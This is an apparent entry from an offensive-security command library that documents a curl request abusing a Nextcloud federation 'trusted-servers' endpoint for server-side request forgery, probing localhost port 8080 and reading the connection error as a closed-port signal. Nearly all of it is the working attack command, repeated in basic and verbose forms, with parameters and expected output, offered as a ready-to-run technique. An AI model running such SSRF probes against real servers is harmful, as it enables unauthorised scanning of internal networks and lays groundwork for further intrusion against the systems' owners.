---
id: cmd-ssrf-port-8080
data: >-
  curl -X POST -d "url=http://127.0.0.1:8080"
  https://target-nextcloud/index.php/apps/federation/trusted-servers
tags:
  - ssrf
  - port-scan
type: command
output: >-
  {"message":"cURL error 7: Failed to connect to 127.0.0.1 port 8080: Connection
  refused"}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.705Z'
verified: false
validated: true
submitted: true
---
# ssrf-probe-port-8080

## Command

```bash
curl -X POST -d "url=http://127.0.0.1:8080" https://target-nextcloud/index.php/apps/federation/trusted-servers
```

## Description

This command performs an SSRF probe on localhost port 8080 to detect if it's closed, using connection refusal as the indicator.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-d "url=http://127.0.0.1:8080"` | Internal URL for port 8080 | Yes |
| `https://target-nextcloud/...` | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d "url=http://127.0.0.1:8080" https://target-nextcloud/index.php/apps/federation/trusted-servers
```

### Advanced Usage

```bash
curl -X POST -d "url=http://127.0.0.1:8080" -v https://target-nextcloud/index.php/apps/federation/trusted-servers
```

## Expected Output

JSON: {"message":"cURL error 7: Failed to connect to 127.0.0.1 port 8080: Connection refused"}, confirming closed port.

## Related

- [[commands/ssrf-probe-port-80]]
- [[procedures/Probe-Localhost-Port-8080-via-SSRF]]
